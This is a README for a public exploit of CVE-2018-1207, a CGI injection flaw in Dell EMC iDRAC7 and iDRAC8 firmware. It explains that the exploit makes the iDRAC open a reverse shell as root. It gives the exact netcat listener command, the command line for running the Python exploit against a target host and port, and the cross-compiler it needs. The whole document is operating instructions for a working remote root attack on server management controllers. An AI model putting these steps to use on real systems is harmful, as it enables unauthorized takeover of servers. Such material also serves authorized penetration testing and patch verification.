# cve-2018-1207
Exploit iDRAC 7 &amp; 8 firmware  &lt;  2.52.52.52

## Description
Dell EMC iDRAC7/iDRAC8, versions prior to 2.52.52.52, contain CGI injection vulnerability which could be used to execute remote code. A remote unauthenticated attacker may potentially be able to use CGI variables to execute remote code.

This code should cause the iDRAC service to open a reverse shell as the root user.

## Usage
Start your local listener:
nc -v -l -p local_port

`nc -v -l -p  5500`

Run the exploit:
python ./cve-2018-1207.py remote_host remote_port local_host local_port

`python ./cve-2018-1207.py 192.168.1.10 443 192.168.1.200 5500`

## Requirements
You need to have a version of `sh4-linux-gnu-gcc` installed, which currently is `sh4-linux-gnu-gcc-11`

You can install it with `apt install gcc-11-sh4-linux-gnu`
